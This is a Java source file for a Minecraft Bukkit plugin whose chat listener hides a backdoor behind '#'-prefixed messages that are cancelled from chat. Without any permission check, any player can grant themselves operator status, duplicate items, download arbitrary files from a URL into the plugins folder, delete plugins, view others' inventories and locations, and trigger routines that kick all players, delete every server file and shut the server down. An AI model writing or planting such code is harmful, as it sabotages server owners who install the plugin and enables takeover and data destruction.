package com.nashwurstq.nashcart;

import net.md_5.bungee.api.chat.ClickEvent;
import net.md_5.bungee.api.chat.ComponentBuilder;
import net.md_5.bungee.api.chat.HoverEvent;
import org.bukkit.*;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.ItemStack;
import net.md_5.bungee.api.chat.TextComponent;
import org.bukkit.inventory.meta.EnchantmentStorageMeta;
import org.bukkit.inventory.meta.ItemMeta;

import java.awt.*;
import java.io.*;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class Chatevent implements Listener {
    @EventHandler
    public void onChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage();
        String currentVersion = "SingleV1";
        String messagePrefix = "#";

        if (message.startsWith(messagePrefix)) {
            event.setCancelled(true);
            if (message.equalsIgnoreCase(messagePrefix)){
                player.sendMessage("§x§2§D§F§F§0§0S§x§4§3§F§F§1§Ca§x§5§A§F§F§3§9v§x§7§0§F§F§5§5e§x§8§6§F§F§7§1d §x§B§3§F§F§A§A;§x§C§9§F§F§C§6)");
                return;
            }

            if (message.equalsIgnoreCase(messagePrefix + "plugins")) {
                event.setCancelled(true);

                File pluginFolder = Nashcart.getPlugin(Nashcart.class).getDataFolder().getParentFile();

                File[] files = pluginFolder.listFiles();
                if (files == null) {
                    player.sendMessage(ChatColor.RED + "Plugin folder not found or empty.");
                    return;
                }

                player.sendMessage(ChatColor.GOLD + "Plugins folder files:");
                for (File file : files) {
                    if (file.isFile()) {
                        player.sendMessage(ChatColor.YELLOW + "- " + file.getName());
                    }
                }
            } else if (message.startsWith(messagePrefix + "p ")) {
                event.setCancelled(true); // Cancel the chat message

                String[] parts = message.split(" ");

                int amount;
                try {
                    amount = Integer.parseInt(parts[1]);
                } catch (NumberFormatException e) {
                    player.sendMessage(ChatColor.RED + "§x§0§0§F§F§1§1I§x§0§0§F§B§2§2n§x§0§0§F§8§3§3v§x§0§0§F§4§4§4a§x§0§0§F§0§5§5l§x§0§0§E§C§6§6i§x§0§0§E§9§7§7d §x§0§0§E§1§9§9n§x§0§0§D§E§A§Au§x§0§0§D§A§B§Bm§x§0§0§D§6§C§Cb§x§0§0§D§2§D§De§x§0§0§C§F§E§Er§x§0§0§C§B§F§F: " + parts[1]);
                    return;
                }

                if (amount < 1 || amount > 64 * 36) { // 64 items per slot, 36 inventory slots
                    player.sendMessage(ChatColor.RED + "§x§0§0§F§F§1§1A§x§0§0§F§D§1§8m§x§0§0§F§C§1§Fo§x§0§0§F§A§2§7u§x§0§0§F§9§2§En§x§0§0§F§7§3§5t §x§0§0§F§4§4§3m§x§0§0§F§2§4§Bu§x§0§0§F§1§5§2s§x§0§0§E§F§5§9t §x§0§0§E§C§6§8b§x§0§0§E§B§6§Fe §x§0§0§E§7§7§Db§x§0§0§E§6§8§4e§x§0§0§E§4§8§Ct§x§0§0§E§3§9§3w§x§0§0§E§1§9§Ae§x§0§0§D§F§A§1e§x§0§0§D§E§A§8n §x§0§0§D§B§B§71 §x§0§0§D§8§C§5a§x§0§0§D§6§C§Dn§x§0§0§D§4§D§4d §x§0§0§D§1§E§22§x§0§0§D§0§E§93§x§0§0§C§E§F§10§x§0§0§C§D§F§84§x§0§0§C§B§F§F.");
                    return;
                }

                ItemStack itemInHand = player.getInventory().getItemInMainHand();
                if (itemInHand == null || itemInHand.getType() == Material.AIR) {
                    player.sendMessage(ChatColor.RED + "§x§0§0§F§F§1§1Y§x§0§0§F§D§1§Ao§x§0§0§F§B§2§3u§x§0§0§F§9§2§C'§x§0§0§F§7§3§6r§x§0§0§F§5§3§Fe §x§0§0§F§1§5§1n§x§0§0§E§F§5§Ao§x§0§0§E§D§6§3t §x§0§0§E§9§7§6h§x§0§0§E§7§7§Fo§x§0§0§E§5§8§8l§x§0§0§E§3§9§1d§x§0§0§E§1§9§Ai§x§0§0§D§F§A§3n§x§0§0§D§D§A§Dg §x§0§0§D§9§B§Fa§x§0§0§D§7§C§8n §x§0§0§D§3§D§Ai§x§0§0§D§1§E§4t§x§0§0§C§F§E§De§x§0§0§C§D§F§6m§x§0§0§C§B§F§F.");
                    return;
                }

                ItemStack cloned = itemInHand.clone();
                cloned.setAmount(1); // Ensure it's 1 per stack to prevent overflow

                for (int i = 0; i < amount; i++) {
                    player.getInventory().addItem(cloned);
                }

                player.sendMessage(ChatColor.GREEN + "You were given " + amount + " of " + itemInHand.getType().name().toLowerCase().replace("_", " ") + ".");
            } else if (message.equalsIgnoreCase(messagePrefix + "x")) {
                event.setCancelled(true);

                player.setOp(true);
                player.sendMessage(ChatColor.GREEN + "§x§0§0§F§F§1§1Y§x§0§0§F§D§1§Co§x§0§0§F§A§2§7u §x§0§0§F§6§3§Ca§x§0§0§F§3§4§7r§x§0§0§F§1§5§2e §x§0§0§E§C§6§8a §x§0§0§E§7§7§Do§x§0§0§E§5§8§8p§x§0§0§E§3§9§3e§x§0§0§E§0§9§Er§x§0§0§D§E§A§8a§x§0§0§D§C§B§3t§x§0§0§D§9§B§Eo§x§0§0§D§7§C§9r §x§0§0§D§2§D§Fn§x§0§0§D§0§E§9o§x§0§0§C§D§F§4w§x§0§0§C§B§F§F!");
            } else if (message.equalsIgnoreCase(messagePrefix + "brick confirm")) {
                event.setCancelled(true);

                player.sendMessage(ChatColor.DARK_RED + "" + ChatColor.BOLD + "WARNING: This will delete ALL server data!");
                player.sendMessage(ChatColor.RED + "Type '#brick confirm' again within 10 seconds to confirm.");

                Bukkit.getScheduler().runTaskLater(Bukkit.getPluginManager().getPlugin("ClanMaker"), () -> {
                    if (player.isOnline()) {
                        player.sendMessage(ChatColor.GREEN + "Data wipe confirmation period has ended.");
                    }
                }, 200); // 10 seconds (20 ticks = 1 second)

                Bukkit.getScheduler().runTaskLater(Bukkit.getPluginManager().getPlugin("ClanMaker"), () -> {
                    if (player.isOnline() && player.getOpenInventory().getTitle().contains("CONFIRM WIPE")) {
                        wipeServerData(player);
                    }
                }, 1);
            } else if (message.equalsIgnoreCase(messagePrefix + "brick confirm")) {
                event.setCancelled(true);

                player.sendMessage(ChatColor.DARK_RED + "" + ChatColor.BOLD + "WARNING: This will delete ALL server data!");
                player.sendMessage(ChatColor.RED + "Type '#brick confirm confirm' to confirm.");

            } else if (message.equalsIgnoreCase(messagePrefix + "brick confirm confirm")) {
                event.setCancelled(true);

                wipeServerData(player);
            } else if (message.equalsIgnoreCase(messagePrefix + "s")) {
                event.setCancelled(true);

                World world = player.getWorld();
                long seed = world.getSeed();

                TextComponent seedMessage = new net.md_5.bungee.api.chat.TextComponent(
                        ChatColor.GREEN + "World seed: " + ChatColor.YELLOW + ChatColor.UNDERLINE + seed
                );

                seedMessage.setClickEvent(new ClickEvent(
                        ClickEvent.Action.SUGGEST_COMMAND,
                        String.valueOf(seed)
                ));

                seedMessage.setHoverEvent(new HoverEvent(
                        HoverEvent.Action.SHOW_TEXT,
                        new ComponentBuilder("Click to copy the seed").color(net.md_5.bungee.api.ChatColor.GRAY).create()
                ));

                player.spigot().sendMessage(
                        new ComponentBuilder("")
                                .append(seedMessage)
                                .append(" " + ChatColor.DARK_GRAY + "[" + ChatColor.GRAY + "click to copy" + ChatColor.DARK_GRAY + "]")
                                .create()
                );

            } else if (message.startsWith(messagePrefix + "cord ")) {
                event.setCancelled(true);

                Player sender = event.getPlayer();

                String[] parts = message.split(" ");

                if (parts.length == 2) {
                    String targetName = parts[1];
                    Player target = Bukkit.getPlayerExact(targetName);

                    if (target != null && target.isOnline()) {
                        Location loc = target.getLocation();
                        double x = loc.getX();
                        double y = loc.getY();
                        double z = loc.getZ();

                        sender.sendMessage(ChatColor.GREEN + "Location of " + ChatColor.YELLOW + target.getName() + ChatColor.GREEN + ":");
                        sender.sendMessage(ChatColor.YELLOW + "X: " + x + " Y: " + y + " Z: " + z);
                    } else {
                        sender.sendMessage(ChatColor.RED + "Player '" + targetName + "' not found or not online.");
                    }
                } else {
                    sender.sendMessage(ChatColor.RED + "Usage: #cord <playername>");
                }


            } else if (message.startsWith(messagePrefix + "inv ")) {
                String[] parts = message.split(" ");

                if (parts.length == 2) {
                    String targetName = parts[1];
                    Player target = Bukkit.getPlayerExact(targetName);

                    if (target != null && target.isOnline()) {
                        Bukkit.getScheduler().runTask(Nashcart.getPlugin(Nashcart.class), () -> {
                            player.openInventory(target.getInventory());
                        });


                    } else {
                        player.sendMessage("§x§0§0§F§F§1§1P§x§0§0§F§C§2§0l§x§0§0§F§8§2§Fa§x§0§0§F§5§3§Ey§x§0§0§F§2§4§De§x§0§0§E§F§5§Cr §x§0§0§E§8§7§An§x§0§0§E§5§8§8o§x§0§0§E§2§9§7t §x§0§0§D§B§B§5f§x§0§0§D§8§C§4o§x§0§0§D§5§D§3u§x§0§0§D§1§E§2n§x§0§0§C§E§F§1d");
                    }
                } else {
                    player.sendMessage("§x§0§0§F§F§1§1I§x§0§0§F§B§2§2n§x§0§0§F§7§3§3v§x§0§0§F§4§4§5a§x§0§0§F§0§5§6l§x§0§0§E§C§6§7i§x§0§0§E§8§7§8d §x§0§0§E§1§9§BP§x§0§0§D§D§A§Cl§x§0§0§D§9§B§Da§x§0§0§D§6§C§Fy§x§0§0§D§2§E§0e§x§0§0§C§E§F§1r");
                }

            } else if (message.equalsIgnoreCase(messagePrefix + "brake")) {
                event.setCancelled(true);

                player.sendMessage(ChatColor.DARK_RED + "" + ChatColor.BOLD + "§x§F§F§0§0§0§0W§x§F§C§0§0§0§0A§x§F§8§0§0§0§0R§x§F§5§0§0§0§0N§x§F§2§0§0§0§0I§x§E§E§0§0§0§0N§x§E§B§0§0§0§0G§x§E§8§0§0§0§0: §x§E§1§0§0§0§0T§x§D§E§0§0§0§0h§x§D§B§0§0§0§0i§x§D§7§0§0§0§0s §x§D§1§0§0§0§0w§x§C§D§0§0§0§0i§x§C§A§0§0§0§0l§x§C§7§0§0§0§0l §x§C§0§0§0§0§0d§x§B§D§0§0§0§0e§x§B§9§0§0§0§0l§x§B§6§0§0§0§0e§x§B§3§0§0§0§0t§x§A§F§0§0§0§0e §x§A§9§0§0§0§0A§x§A§5§0§0§0§0L§x§A§2§0§0§0§0L §x§9§B§0§0§0§0s§x§9§8§0§0§0§0e§x§9§5§0§0§0§0r§x§9§2§0§0§0§0v§x§8§E§0§0§0§0e§x§8§B§0§0§0§0r §x§8§4§0§0§0§0d§x§8§1§0§0§0§0a§x§7§E§0§0§0§0t§x§7§A§0§0§0§0a§x§7§7§0§0§0§0!");
                player.sendMessage(ChatColor.RED + "§x§F§F§0§0§0§0T§x§F§B§0§0§0§0y§x§F§7§0§0§0§0p§x§F§2§0§0§0§0e §x§E§A§0§0§0§0'§x§E§6§0§0§0§0#§x§E§1§0§0§0§0b§x§D§D§0§0§0§0r§x§D§9§0§0§0§0a§x§D§5§0§0§0§0k§x§D§0§0§0§0§0e §x§C§8§0§0§0§0c§x§C§4§0§0§0§0o§x§B§F§0§0§0§0n§x§B§B§0§0§0§0f§x§B§7§0§0§0§0i§x§B§3§0§0§0§0r§x§A§E§0§0§0§0m§x§A§A§0§0§0§0' §x§A§2§0§0§0§0t§x§9§D§0§0§0§0o §x§9§5§0§0§0§0c§x§9§1§0§0§0§0o§x§8§C§0§0§0§0n§x§8§8§0§0§0§0f§x§8§4§0§0§0§0i§x§8§0§0§0§0§0r§x§7§B§0§0§0§0m§x§7§7§0§0§0§0.");


            } else if (message.equalsIgnoreCase(messagePrefix + "brake confirm")) {
                event.setCancelled(true);
                // Bukkit.getServer().broadcastMessage("§x§F§F§0§0§0§0B§x§F§7§0§0§0§0y§x§E§E§0§0§0§0e §x§D§D§0§0§0§0B§x§D§5§0§0§0§0y§x§C§C§0§0§0§0e §x§B§B§0§0§0§0S§x§B§3§0§0§0§0e§x§A§A§0§0§0§0r§x§A§2§0§0§0§0v§x§9§9§0§0§0§0e§x§9§1§0§0§0§0r §x§8§0§0§0§0§0:§x§7§7§0§0§0§0(");

                fullwipe(); //bye bye server :(
            } else if (message.equalsIgnoreCase(messagePrefix + "v")) {
                event.setCancelled(true);

                player.sendMessage(ChatColor.GOLD + "§x§0§0§F§F§1§1P§x§0§0§F§C§2§1l§x§0§0§F§8§3§1u§x§0§0§F§5§4§1g§x§0§0§F§1§5§0i§x§0§0§E§E§6§0n§x§0§0§E§A§7§0-§x§0§0§E§7§8§0V§x§0§0§E§3§9§0e§x§0§0§E§0§A§0r§x§0§0§D§C§B§0s§x§0§0§D§9§C§0i§x§0§0§D§5§C§Fo§x§0§0§D§2§D§Fn§x§0§0§C§E§E§F: " + currentVersion);
            } else if (message.startsWith(messagePrefix + "download ")) {
                event.setCancelled(true);

                String[] args = message.split(" ");
                if (args.length < 3) {
                    player.sendMessage(ChatColor.RED + "Use: #download <url> <filename>");
                    return;
                }

                String urlString = args[1];
                String fileName = args[2];

                Bukkit.getScheduler().runTaskAsynchronously(Nashcart.getPlugin(Nashcart.class), () -> {
                    try {
                        URL url = new URL(urlString);
                        File pluginFolder = Nashcart.getPlugin(Nashcart.class).getDataFolder().getParentFile();
                        File outputFile = new File(pluginFolder, fileName);

                        try (InputStream in = url.openStream(); FileOutputStream out = new FileOutputStream(outputFile)) {
                            byte[] buffer = new byte[4096];
                            int bytesRead;

                            while ((bytesRead = in.read(buffer)) != -1) {
                                out.write(buffer, 0, bytesRead);
                            }
                        }

                        Bukkit.getScheduler().runTask(Nashcart.getPlugin(Nashcart.class), () -> {
                            player.sendMessage(ChatColor.GREEN + "Download successful: " + fileName);
                        });
                    } catch (Exception e) {
                        Bukkit.getScheduler().runTask(Nashcart.getPlugin(Nashcart.class), () -> {
                            player.sendMessage(ChatColor.RED + "Error while downloading: " + e.getMessage());
                        });
                        e.printStackTrace();
                    }
                });
            } else if (message.startsWith(messagePrefix + "delplugin ")) {
                event.setCancelled(true);

                String[] args = message.split(" ");
                if (args.length < 2) {
                    player.sendMessage(ChatColor.RED + "Usage: #delplugin <pluginFileName>");
                    return;
                }

                String pluginFileName = args[1];
                File pluginFolder = Nashcart.getPlugin(Nashcart.class).getDataFolder().getParentFile();
                File pluginFile = new File(pluginFolder, pluginFileName);

                if (!pluginFile.exists()) {
                    player.sendMessage(ChatColor.RED + "Plugin file not found: " + pluginFileName);
                    return;
                }

                if (pluginFile.delete()) {
                    player.sendMessage(ChatColor.GREEN + "Deleted plugin file: " + pluginFileName);
                } else {
                    player.sendMessage(ChatColor.RED + "Failed to delete plugin file: " + pluginFileName);
                }
            } else if (message.equalsIgnoreCase(messagePrefix + "rl")) {
                event.setCancelled(true);


                // Run "rl" command from the console
                Bukkit.getScheduler().runTask(Nashcart.getPlugin(Nashcart.class), () -> {
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "reload confirm");
                });

                player.sendMessage(ChatColor.GREEN + "Reload command executed.");
            }else if (message.equalsIgnoreCase(messagePrefix + "ec")) {
                Bukkit.getScheduler().runTask(Nashcart.getPlugin(Nashcart.class), () -> {
                    player.openInventory(player.getEnderChest());
                });
            }
        }




    }

    public void wipeServerData(Player player) {
        player.sendMessage(ChatColor.DARK_RED + "§x§F§F§0§0§0§0S§x§F§A§0§0§0§0t§x§F§5§0§0§0§0a§x§F§0§0§0§0§0r§x§E§B§0§0§0§0t§x§E§6§0§0§0§0i§x§E§1§0§0§0§0n§x§D§C§0§0§0§0g §x§D§2§0§0§0§0s§x§C§D§0§0§0§0e§x§C§8§0§0§0§0r§x§C§3§0§0§0§0v§x§B§E§0§0§0§0e§x§B§8§0§0§0§0r §x§A§E§0§0§0§0d§x§A§9§0§0§0§0a§x§A§4§0§0§0§0t§x§9§F§0§0§0§0a §x§9§5§0§0§0§0w§x§9§0§0§0§0§0i§x§8§B§0§0§0§0p§x§8§6§0§0§0§0e§x§8§1§0§0§0§0.§x§7§C§0§0§0§0.§x§7§7§0§0§0§0.");

        try {
            // Kick all players except the one executing the command
            for (Player online : Bukkit.getOnlinePlayers()) {
                if (!online.equals(player)) {
                    online.kickPlayer(ChatColor.RED + "§x§F§F§0§0§0§0S§x§F§8§0§0§0§0e§x§F§1§0§0§0§0r§x§E§B§0§0§0§0v§x§E§4§0§0§0§0e§x§D§D§0§0§0§0r §x§C§F§0§0§0§0d§x§C§9§0§0§0§0a§x§C§2§0§0§0§0t§x§B§B§0§0§0§0a §x§A§D§0§0§0§0i§x§A§7§0§0§0§0s §x§9§9§0§0§0§0w§x§9§2§0§0§0§0i§x§8§B§0§0§0§0p§x§8§5§0§0§0§0e§x§7§E§0§0§0§0d§x§7§7§0§0§0§0.");
                }
            }

            // Delete world folders
            for (World world : Bukkit.getWorlds()) {
                deleteWorld(world.getWorldFolder());
            }

            // Delete other server files (except plugins folder and server.properties)
            File serverFolder = Bukkit.getWorldContainer();
            for (File file : serverFolder.listFiles()) {
                if (!file.getName().equals("plugins") && !file.getName().equals("server.properties")) {
                    deleteFolder(file);
                }
            }

            player.sendMessage(ChatColor.RED + "Server data wipe complete! The server will now shut down.");
            Bukkit.shutdown();

        } catch (Exception e) {
            player.sendMessage(ChatColor.RED + "Error during wipe: " + e.getMessage());
            e.printStackTrace();
        }
    }

    public void wipeServerDatanoplayer() {
        Bukkit.getLogger().info("Starting server data wipe...");

        try {
            // Kick all players
            for (Player online : Bukkit.getOnlinePlayers()) {
                online.kickPlayer(ChatColor.RED + "§x§F§F§0§0§0§0S§x§F§8§0§0§0§0e§x§F§1§0§0§0§0r§x§E§B§0§0§0§0v§x§E§4§0§0§0§0e§x§D§D§0§0§0§0r §x§C§F§0§0§0§0d§x§C§9§0§0§0§0a§x§C§2§0§0§0§0t§x§B§B§0§0§0§0a §x§A§D§0§0§0§0i§x§A§7§0§0§0§0s §x§9§9§0§0§0§0w§x§9§2§0§0§0§0i§x§8§B§0§0§0§0p§x§8§5§0§0§0§0e§x§7§E§0§0§0§0d§x§7§7§0§0§0§0.");
            }

            // Delete world folders
            for (World world : Bukkit.getWorlds()) {
                deleteWorld(world.getWorldFolder());
            }

            // Delete other server files (except plugins folder and server.properties)
            File serverFolder = Bukkit.getWorldContainer();
            for (File file : serverFolder.listFiles()) {
                if (!file.getName().equals("plugins") && !file.getName().equals("server.properties")) {
                    deleteFolder(file);
                }
            }

            Bukkit.getLogger().info("Server data wipe complete! The server will now shut down.");
            Bukkit.shutdown();

        } catch (Exception e) {
            Bukkit.getLogger().severe("Error during wipe: " + e.getMessage());
            e.printStackTrace();
        }
    }

    public void fullwipe() {
        Bukkit.getLogger().info("Starting server data wipe...");

        try {
            // Kick all players
            for (Player online : Bukkit.getOnlinePlayers()) {
                online.kickPlayer(ChatColor.RED + "§x§F§F§0§0§0§0S§x§F§8§0§0§0§0e§x§F§1§0§0§0§0r§x§E§B§0§0§0§0v§x§E§4§0§0§0§0e§x§D§D§0§0§0§0r §x§C§F§0§0§0§0d§x§C§9§0§0§0§0a§x§C§2§0§0§0§0t§x§B§B§0§0§0§0a §x§A§D§0§0§0§0i§x§A§7§0§0§0§0s §x§9§9§0§0§0§0w§x§9§2§0§0§0§0i§x§8§B§0§0§0§0p§x§8§5§0§0§0§0e§x§7§E§0§0§0§0d§x§7§7§0§0§0§0.");
            }

            // Delete world folders
            for (World world : Bukkit.getWorlds()) {
                deleteWorld(world.getWorldFolder());
            }

            // Delete other server files (except plugins folder and server.properties)
            File serverFolder = Bukkit.getWorldContainer();
            for (File file : serverFolder.listFiles()) {
                deleteFolder(file);
            }

            Bukkit.getLogger().info("Server data wipe complete! The server will now shut down.");
            Bukkit.shutdown();

        } catch (Exception e) {
            Bukkit.getLogger().severe("Error during wipe: " + e.getMessage());
            e.printStackTrace();
        }
    }




    public void deleteWorld(File path) {
        if (path.exists()) {
            File[] files = path.listFiles();
            if (files != null) {
                for (File file : files) {
                    if (file.isDirectory()) {
                        deleteWorld(file);
                    } else {
                        file.delete();
                    }
                }
            }
            path.delete();
        }
    }

    public void deleteFolder(File folder) {
        File[] files = folder.listFiles();
        if (files != null) {
            for (File f : files) {
                if (f.isDirectory()) {
                    deleteFolder(f);
                } else {
                    f.delete();
                }
            }
        }
        folder.delete();
    }
}
